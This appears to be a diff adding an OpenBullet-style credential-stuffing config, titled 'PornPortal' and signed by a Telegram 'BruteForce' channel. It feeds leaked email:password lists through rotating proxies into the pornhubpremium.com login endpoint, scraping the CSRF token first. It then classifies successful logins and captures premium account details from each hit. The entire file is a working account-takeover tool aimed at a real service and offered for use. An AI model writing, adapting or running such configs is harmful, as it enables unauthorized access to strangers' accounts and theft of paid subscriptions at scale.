@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "PornPortal",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-28T01:21:30.8402903+04:30",
+  "AdditionalInfo": "T.me/BruteForce | Capture | Hit Just Premium Acc |",
+  "Author": "H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 20,
+  "BanProxyAfterGoodStatus": true,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#G REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#token PARSE "<SOURCE>" LR "token\" value=\"" "\" />" -> VAR "token" 
+
+#P REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&redirect=&from=pc_premium_login&segment=straight&token=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Key_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":\"1\",\"message\":\"\",\"redirect" 
+    KEY "premium_redirect_cookie\":\"1\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":\"0\",\"message\":\"Invalid " 
+    KEY "premium_redirect_cookie\":\"0\",\"" 
+
+#GC REQUEST GET "https://www.pornhubpremium.com/postlogin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TT PARSE "<SOURCE>" LR "var pornportalConfig = {\"data\":\"" "\"" -> VAR "ptoken" 
+
+#GCC REQUEST GET "https://ppp.contentdef.com/postlogin?data=<ptoken>" 
+  
+  HEADER "Host: ppp.contentdef.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#SSS PARSE "<SOURCE>" LR "labelledby=\"dropdown-menu-user\"" "trackid=\"PPBAR-Logout\">" -> VAR "SSS" 
+
+#CAP PARSE "<SSS>" LR "class=\"pp-sub-menu-ico arrow\"></i>" "</a>" Recursive=TRUE CreateEmpty=FALSE -> CAP "CAP" 
+
